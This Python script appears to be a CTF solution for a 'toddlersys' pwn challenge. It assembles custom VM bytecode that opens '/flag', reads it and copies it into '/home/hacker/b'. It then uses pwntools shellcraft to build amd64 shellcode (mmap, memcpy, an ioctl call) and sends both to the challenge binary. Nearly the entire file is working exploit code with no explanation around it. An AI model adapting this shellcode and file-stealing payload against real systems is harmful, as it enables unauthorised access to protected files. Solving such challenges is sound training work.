#!/usr/bin/python

'''
op   : op[2]
arg1 : op[1]
arg2 : op[3]
'''
import os
def getarg(arg):
    if arg[0:2] == "0x":
        return int(arg, 16).to_bytes(1, "little")
    if arg[0] == "*":
        arg=arg[1:]
    ireg = 1
    reg="cbiasdf"
    if reg.find(arg) != -1:
        ireg = ireg << reg.find(arg)
        return ireg.to_bytes(1, "little")
    elif arg == "open":
        return b"\x04"
    elif arg == "read_memory":
        return b"\x02"
    elif arg == "write":
        return b"\x20"
    return None
def assembly(ass):
    if ass == "":
        return b""
    bc = bytearray()
    ass = ass.split(" ")
    if(ass[0] == "IMM"):
        op = b"\x20"
    elif(ass[0] == "ADD"):
        op = b"\x01"
    elif(ass[0] == "STK"):
        op = b"\x10"
    elif(ass[0] == "STM"):
        op = b"\x02"
    elif(ass[0] == "LDM"):
        op = b"\x08"
    elif(ass[0] == "CMP"):
        op = b"\x04"
    elif(ass[0] == "JMP"):
        op = b"\x40"
    elif(ass[0] == "SYS"):
        op = b"\x80"
    
    for i in ass:
        c = getarg(i)
        if c != None:
            bc = bc + bytearray(c)

    bc.insert(1, op[0])
    return bc

c = bytearray()
yangasm = '''
IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x66
IMM c = 0x81
STM *c = d

IMM d = 0x6c
IMM c = 0x82
STM *c = d

IMM d = 0x61
IMM c = 0x83
STM *c = d

IMM d = 0x67
IMM c = 0x84
STM *c = d

IMM d = 0x0
IMM c = 0x85
STM *c = d

IMM a = 0x80
IMM b = 0x40
IMM c = 0xff
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS read_memory a


IMM d = 0x2f
IMM c = 0x80
STM *c = d

IMM d = 0x68
IMM c = 0x81
STM *c = d

IMM d = 0x6f
IMM c = 0x82
STM *c = d

IMM d = 0x6d
IMM c = 0x83
STM *c = d

IMM d = 0x65
IMM c = 0x84
STM *c = d

IMM d = 0x2f
IMM c = 0x85
STM *c = d

IMM d = 0x68
IMM c = 0x86
STM *c = d

IMM d = 0x61
IMM c = 0x87
STM *c = d

IMM d = 0x63
IMM c = 0x88
STM *c = d

IMM d = 0x6b
IMM c = 0x89
STM *c = d

IMM d = 0x65
IMM c = 0x8a
STM *c = d

IMM d = 0x72
IMM c = 0x8b
STM *c = d

IMM d = 0x2f
IMM c = 0x8c
STM *c = d

IMM d = 0x62
IMM c = 0x8d
STM *c = d

IMM d = 0x0
IMM c = 0x8e
STM *c = d

IMM a = 0x80
IMM b = 0x02
IMM c = 0x00
SYS open a

IMM b = 0x00
IMM c = 0xff
SYS write a
'''


yangasm = yangasm.split("\n")
for i in yangasm:
    c+=assembly(i)

# with open("/home/hacker/ttt-raw", 'wb') as file:
#     file.write(c)
#     file.close()


from pwn import *
# display the bytes
# print(disasm(my_sc))
context.arch="amd64"
p = process("/challenge/toddlersys_level1.1")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlerone_level10.0")
# print(p.readuntil(b'yancode: '))
byte_codes = asm(shellcraft.mmap(0, 0x100, 0x03, 0x01, 3, 0) + 
                 shellcraft.memcpy("rax", 0x3133703d, len(c)) + 
                 shellcraft.ioctl(3, 1337))



p.send(byte_codes + c)

all = p.recvall()

print(all.decode(errors="ignore"))

